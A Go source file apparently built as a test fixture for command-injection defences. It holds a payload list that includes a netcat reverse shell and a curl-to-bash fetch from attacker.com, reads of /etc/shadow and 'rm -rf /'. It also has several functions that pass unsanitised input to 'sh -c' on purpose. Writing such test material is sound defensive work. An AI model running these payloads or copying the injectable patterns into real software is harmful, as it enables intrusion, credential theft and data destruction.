// Package intentionalvulns contains INTENTIONAL vulnerabilities for testing.
// These should be EXCLUDED from security scanner results.
package intentionalvulns

import (
	"fmt"
	"os/exec"
)

// CommandInjectionPayloads for testing input validation
var CommandInjectionPayloads = []string{
	"; ls -la",
	"| cat /etc/passwd",
	"&& whoami",
	"$(cat /etc/shadow)",
	"`id`",
	"; nc -e /bin/sh attacker.com 4444",
	"| curl http://attacker.com/shell.sh | bash",
	"; rm -rf /",
}

// VulnerableExec is INTENTIONALLY VULNERABLE for testing security controls.
// It should be caught by security middleware before execution.
func VulnerableExec(userInput string) (string, error) {
	// INTENTIONAL COMMAND INJECTION
	cmd := exec.Command("sh", "-c", fmt.Sprintf("echo %s", userInput))
	output, err := cmd.Output()
	return string(output), err
}

// VulnerableCommandBuilder is INTENTIONALLY VULNERABLE.
// Used to test command injection prevention.
func VulnerableCommandBuilder(command string, args ...string) *exec.Cmd {
	// INTENTIONAL - concatenates without sanitization
	fullCommand := command
	for _, arg := range args {
		fullCommand += " " + arg
	}
	return exec.Command("sh", "-c", fullCommand)
}

// TestHelper provides utilities for command injection testing.
type TestHelper struct{}

// ExecuteRaw runs a command without any validation.
// WARNING: INTENTIONALLY INSECURE - only for testing.
func (t *TestHelper) ExecuteRaw(cmd string) ([]byte, error) {
	// INTENTIONAL vulnerability
	return exec.Command("sh", "-c", cmd).Output()
}

// BuildPipeline creates a shell pipeline from user input.
// WARNING: INTENTIONALLY INSECURE - only for testing.
func (t *TestHelper) BuildPipeline(commands []string) *exec.Cmd {
	// INTENTIONAL - joins commands with pipes
	pipeline := ""
	for i, cmd := range commands {
		if i > 0 {
			pipeline += " | "
		}
		pipeline += cmd
	}
	return exec.Command("sh", "-c", pipeline)
}
